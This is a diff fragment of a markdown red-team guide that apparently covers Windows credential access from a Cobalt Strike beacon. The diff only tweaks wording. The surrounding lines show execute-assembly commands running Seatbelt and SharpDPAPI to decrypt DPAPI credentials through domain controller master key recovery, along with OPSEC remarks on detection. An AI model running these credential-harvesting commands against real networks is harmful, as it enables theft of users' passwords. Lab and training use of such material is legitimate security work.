@@ -59,7 +59,7 @@ beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Win
 ```shell
 # Decrypt credentials using /rpc to request master key recovery from the DC
 # OPSEC — /rpc adds communication with the domain controller through MS-BKRP.
-# To limit further target interaction, analyze material already available in the lab offline,
+# To limit further target interaction, analyze material already available in the example offline,
 # if the required keys are available; this does not remove traces of its earlier collection.
 # BOFs and in-memory execution do not guarantee lower detection.
 beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
@@ -86,7 +86,7 @@ beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.e
 
 If decryption fails, check the effective user, available keys and DC access for `/rpc`. A `TERMSRV` entry identifies a saved target; it does not prove the service remains reachable or the password is still valid.
 
-Source reference: [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/master/README.md).
+Reference: [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/master/README.md).
 
 ## 6. Quick checklist
 
